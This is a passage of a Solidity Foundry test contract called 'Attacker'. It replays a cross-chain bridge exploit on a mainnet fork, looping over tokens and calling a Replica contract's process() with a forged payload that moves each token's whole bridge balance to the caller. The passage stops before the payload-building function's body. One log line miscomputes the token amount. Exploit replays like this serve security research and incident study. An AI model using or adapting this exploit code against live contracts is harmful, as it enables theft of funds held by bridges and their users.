...
interface IReplica {
    function process(bytes memory _message) external returns (bool _succcess);
}
...
contract Attacker is Test {
    ...
    function setUp() public {
        cheats.createSelectFork("mainnet", 21_297_409);
    }

    function testAttack() external {
        for (uint256 i = 0; i < tokens.length; i++) {
            address token = tokens[i];
            uint256 amountBridge = ERC20(token).balanceOf(ERC20_BRIDGE);

            console.log("[*] Stealing", amountBridge / 10 * ERC20(token).decimals(), ERC20(token).symbol());
            console.log("Attacker balance before: ", ERC20(token).balanceOf(msg.sender) / 10 ** ERC20(token).decimals());

            //Generate the payload with all of the tokens stored in the bridge
            bytes memory payload = _genPayload(msg.sender, token, amountBridge);

            bool success = IReplica(REPLICA).process(payload);
            require(success, "Failed to process payload");

            console.log("Attacker balance after: ", ERC20(token).balanceOf(msg.sender) / 10 ** ERC20(token).decimals());
        }
    }

    function _genPayload(address recipient, address token, uint256 amount)
        internal
        pure
